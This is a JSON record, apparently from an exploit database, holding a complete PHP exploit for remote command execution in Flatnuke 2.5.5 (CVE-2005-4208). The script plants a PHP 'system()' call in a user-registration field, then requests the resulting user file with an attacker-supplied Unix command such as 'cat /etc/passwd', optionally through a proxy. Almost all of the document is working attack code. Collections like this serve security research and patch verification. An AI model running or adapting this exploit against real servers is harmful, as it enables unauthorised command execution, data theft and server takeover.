{
  "id": "1140",
  "title": "Flatnuke 2.5.5 - Remote Code Execution",
  "cve": "CVE-2005-4208",
  "vuln_type": "rce",
  "code": "<?php\r\n/* Aug 2005, 4th\r\n   Flatnuke 2.5.5 (possibly prior versions) remote code execution\r\n   by rgod\r\n   site: http://rgod.altervista.org\r\n\r\n   thanks to UlisseHacker... :)\r\n\r\n   make these changes in php.ini if you have troubles\r\n   with this script:\r\n   allow_call_time_pass_reference = on\r\n   register_globals = on\t\t\t\t\t\t       */\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho '<head><title>FlatNuke 2.5.5 remote commands execution</title>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n      <style type=\"text/css\">\r\n      <!--\r\n      body,td,th {color: #00FF00;}\r\n      body {background-color: #000000;}\r\n      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }\r\n      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;\r\n\t       font-weight: bold;\r\n\t       font-style: italic;\r\n              }\r\n      -->\r\n      </style></head>\r\n      <body>\r\n<p class=\"Stile6\">FlatNuke 2.5.5 (possibly prior versions) remote commands execution</p>\r\n<p class=\"Stile6\">a script by rgod at <a href=\"http://rgod.altervista.org\" target=\"_blank\">http://rgod.altervista.org</a></p>\r\n<table width=\"84%\" >\r\n  <tr>\r\n    <td width=\"43%\">\r\n     <form name=\"form1\" method=\"post\" action=\"'.$SERVER['PHP_SELF'].'?path=value&host=value&port=value&command=value&proxy=value\">\r\n      <p>\r\n       <input type=\"text\" name=\"host\">\r\n      <span class=\"Stile5\">hostname (ex: www.sitename.com) </span></p>\r\n      <p>\r\n        <input type=\"text\" name=\"path\">\r\n        <span class=\"Stile5\">path (ex: /flatnuke/forum/ or /forum/ just /) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"port\">\r\n        <span class=\"Stile5\">specify a port other than 80 (default value) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"command\">\r\n        <span class=\"Stile5\">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"proxy\">\r\n        <span class=\"Stile5\">send exploit through an HTTP proxy (ip:port)  </span></p>\r\n      <p>\r\n          <input type=\"submit\" name=\"Submit\" value=\"go!\">\r\n      </p>\r\n    </form></td>\r\n  </tr>\r\n</table>\r\n</body>\r\n</html>';\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>  </td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>  </td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\n\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nif (($path<>'') and ($host<>'') and ($command<>''))\r\n{\r\nif ($port=='') {$port=80;}\r\n$data=\"op=reg&nome=jimyhendrix\u00aepass=jimihendrix&reregpass=jimihendrix&anag=jimihendrix&email=jimihendrix@email.com&homep=\".urlencode('http://www.asite.com').\"&prof=artist&prov=whereimfrom&ava=clanbomber.png&url_avatar=&firma=\".chr(13).urlencode('system($HTTP_GET_VARS[command]);');\r\n\r\nif ($proxy=='')\r\n       {$packet=\"POST \".$path.\"index.php HTTP/1.1\\r\\n\";}\r\nelse\r\n       {\r\n        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);\r\n        if ($c==0) {\r\n                    echo 'check the proxy...<br>';\r\n\t            die;\r\n\t           }\r\n         else\r\n        {$packet=\"POST http://\".$host.$path.\"index.php HTTP/1.1\\r\\n\";}\r\n        }\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\":\".$port.$path.\"index.php?op=vis_reg\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n\r\nshow($packet);\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\nwhile ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\nfclose($fp);\r\necho nl2br(htmlentities($data));\r\nif ($proxy=='')\r\n       {$packet=\"GET \".$path.\"users/jimyhendrix.php?command=\".urlencode($command).\" HTTP/1.1\\r\\n\";}\r\nelse\r\n       {\r\n        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);\r\n        if ($c==0) {\r\n                    echo 'check the proxy...<br>';\r\n\t            die;\r\n\t           }\r\n         else\r\n        {$packet=\"GET http://\".$host.$path.\"users/jimyhendrix.php?command=\".urlencode($command).\" HTTP/1.1\\r\\n\";}\r\n        }\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $fp=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$fp) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\r\n\t    }\r\nfputs($fp,$packet);\r\n$data='';\r\n\r\nif ($proxy=='')\r\n{    $data='';\r\n     while (!feof($fp))\r\n     {\r\n      $data.=fgets($fp);\r\n     }\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\n\r\nfclose($fp);\r\n\r\nif (eregi('HTTP/1.1 200 OK',$data))\r\n    {echo 'Exploit sent...<br> If Flatnuke is unpatched and vulnerable <br>';\r\n     echo 'you will see '.htmlentities($command).' output inside HTML...<br><br>';\r\n    }\r\nelse\r\n    {echo 'Error, see output...';}\r\necho nl2br(htmlentities($data));\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-08-08]",
  "url": "https://www.exploit-db.com/exploits/1140"
}